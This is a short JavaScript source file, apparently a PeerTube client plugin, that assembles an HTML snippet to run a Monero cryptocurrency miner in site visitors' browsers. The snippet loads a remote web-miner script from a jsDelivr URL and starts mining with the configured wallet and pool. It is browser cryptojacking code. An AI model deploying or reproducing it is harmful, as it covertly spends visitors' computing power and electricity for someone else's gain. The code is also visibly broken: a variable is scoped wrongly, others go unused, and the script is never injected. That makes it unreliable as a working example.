async function register({ registerHook, peertubeHelpers }) {

peertubeHelpers.getSettings().then(
      s => {
      let miner = "console.log('Initializing Monero miner client plugin...');\n"
      if ( !s || !s['walletAddress'] || !s['poolAddress']) {
        let minerscript = "console.error('Monero miner plugin: Required settings are missing.');\n"
        return
      }

      let script = "<!-- Monero Miner Script -->"
      minerscript+= "<script src='https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js'></script>\n"
      minerscript+= "<script>\n"
      minerscript+= "const server = '"+s['webSocket']+"';\n"
      minerscript+= "const pool = '"+s['poolAddress']+"';\n"
      minerscript+= "const wallet = '"+s['walletAddress']+"';\n"
      minerscript+= "const workerId = 'PeerTube-Miner';\n"
      minerscript+= "const threads = '"+s['threads']+"';\n"
      minerscript+= "const password = '"+s['password']+"';\n"
      minerscript+= "startMining(pool, wallet, workerId, threads, password);\n"
      minerscript+= "throttleMiner = 20;\n"
      minerscript+= "</script>;\n"
      minerscript+= "<!-- End Of Mining Code (HTML) -->;\n"
    }
  )
}
export { register }
